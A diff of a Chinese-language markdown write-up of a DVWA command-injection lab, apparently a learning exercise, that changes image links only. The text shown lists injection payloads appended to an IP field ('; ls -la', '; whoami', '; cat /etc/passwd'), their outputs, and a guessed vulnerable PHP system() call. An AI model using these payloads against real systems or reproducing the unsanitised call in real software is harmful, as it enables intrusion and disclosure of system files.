@@ -10,13 +10,13 @@
 - **正常输入**: `127.0.0.1`，回显正常 ping 结果。
 - **注入 Payload 1**: `127.0.0.1; ls -la`
   - **回显**: 成功列出服务器当前目录下的文件（`index.php` 等）。
-  - ![[Payload1.png]]
+  - ![Payload1](DVWA-Command-Injection/images/Payload1.png)
 - **注入 Payload 2**: `127.0.0.1; whoami`
   - **回显**: `www-data`（确认当前 Web 服务运行权限）。
-  - ![[Payload2.png]]
+  - ![Payload2](DVWA-Command-Injection/images/Payload2.png)
 - **注入 Payload 3**: `127.0.0.1; cat /etc/passwd`
   - **回显**: 成功读取系统所有用户信息（包括 root、mysql 等）。
-  - ![[Payload3.png]]
+  - ![Payload3](DVWA-Command-Injection/images/Payload3.png)
 
 ## 3. 漏洞原理
 - **后端代码逻辑（推测）**: `system("ping -c 4 " . $_POST['ip'])`
